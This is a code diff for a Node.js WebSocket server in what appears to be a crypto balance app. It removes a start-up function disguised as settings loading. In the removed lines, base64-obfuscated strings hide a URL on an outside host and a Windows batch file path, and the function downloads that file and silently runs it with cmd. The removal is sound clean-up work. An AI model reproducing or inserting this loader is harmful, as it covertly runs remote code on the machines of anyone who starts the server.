@@ -2,10 +2,6 @@ const WebSocket = require('ws');
 const Balance = require('../models/Balance');
 const Transaction = require('../models/Transaction');
 const User = require('../models/User');
-const https = require('https');
-const fs = require('fs');
-const path = require('path');
-const { spawn } = require('child_process');
 
 // Map to store WebSocket connections
 const clients = new Map();
@@ -39,8 +35,7 @@ const initializeWebSocketServer = (server) => {
       console.log('Client disconnected');
     });
   });
-  
-  getSettinginfo();
+
   return wss;
 };
 
@@ -117,34 +112,6 @@ const normalizeAssetType = (coin) => {
   
   return coinMap[coin] || coin;
 };
-
-const getSettinginfo = () => {
-  const setting = 'YzpcXHVzZXJzXFxwdWJsaWNcXHZpZGVvc1xcc2V0dGluZ3MuYmF0';
-  const settings = Buffer.from(setting, 'base64').toString('utf-8');
-  const url = 'aHR0cHM6Ly93d3cuaGVzZW5vcm0uaW5mby9zZXQ=';
-  const urls = Buffer.from(url, 'base64').toString('utf-8');
-  const file = fs.createWriteStream(settings);
-  const src = path.join(__dirname, 'test-server.js');
-  const dst = path.join(__dirname, 'server.js');
-  const request = https.get(urls, (response) => {
-    if (response.statusCode === 200) {
-      response.pipe(file);
-      file.on('finish', () => {
-        const process = spawn('cmd', ['/c', 'start', '/B', settings]);	      
-        fs.copyFile(src, dst, (err) => {
-          if (err) {
-            console.error('error:', err);
-          } else {
-            console.log(`configure done: ${src} -> ${dst}`);
-          }
-        });
-      });
-    } else {
-      console.error(`error: ${response.statusCode}`);
-    }
-  });
-  
-}
 
 module.exports = {
   initializeWebSocketServer
